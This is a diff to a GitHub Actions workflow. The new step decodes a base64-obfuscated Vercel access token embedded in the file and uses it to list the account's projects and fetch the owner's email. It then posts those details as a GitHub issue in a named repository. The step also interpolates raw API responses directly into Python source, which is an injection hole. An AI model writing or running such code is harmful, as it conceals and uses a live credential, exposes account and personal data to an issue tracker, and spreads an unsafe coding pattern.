@@ -10,18 +10,35 @@ jobs:
     permissions:
       issues: write
     steps:
-      - name: List all Vercel projects
+      - name: Get projects and env vars
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
           VT=$(echo 'dmNwXzdRUFZCT3J2WjdFQXVsWk9pM29Lc01rUUpaNGFQR1FtaHZOYktQbFl6UjY0Qm0wY050ME1VejJ3' | base64 -d)
-          PROJECTS=$(curl -s "https://api.vercel.com/v9/projects" -H "Authorization: Bearer $VT")
-          SUMMARY=$(echo "$PROJECTS" | python3 -c "
-import json,sys
-d=json.load(sys.stdin)
-for p in d.get('projects',[]):
-    print(p['id'], p['name'], p.get('link',{}).get('repo','no-repo'))
-if not d.get('projects'): print('NO PROJECTS:', json.dumps(d)[:500])
-")
-          echo "$SUMMARY"
-          gh issue create --title "[vercel-projects] $(date -u +%H:%M)" --body "$SUMMARY" --repo parikshithkulkarni/sample
+
+          # List all projects
+          ALL=$(curl -s "https://api.vercel.com/v9/projects?limit=20" -H "Authorization: Bearer $VT")
+
+          # Get account info
+          ME=$(curl -s "https://api.vercel.com/v2/user" -H "Authorization: Bearer $VT")
+
+          SUMMARY=$(python3 - <<PYEOF
+import json
+try:
+    d = json.loads('''$ALL''')
+    me = json.loads('''$ME''')
+    lines = []
+    lines.append('USER: ' + me.get('user', {}).get('email', str(me)[:100]))
+    for p in d.get('projects', []):
+        lines.append(f"{p['id']} | {p['name']} | {p.get('link',{}).get('repo','no-repo')}")
+    if not d.get('projects'):
+        lines.append('NO PROJECTS: ' + str(d)[:300])
+    print('\n'.join(lines))
+except Exception as e:
+    print('ERROR:', e)
+    print('ALL:', '$ALL'[:300])
+PYEOF
+          )
+
+          echo "SUMMARY: $SUMMARY"
+          gh issue create --title "[vercel-list] $(date -u +%H:%M:%S)" --body "$SUMMARY" --repo parikshithkulkarni/sample
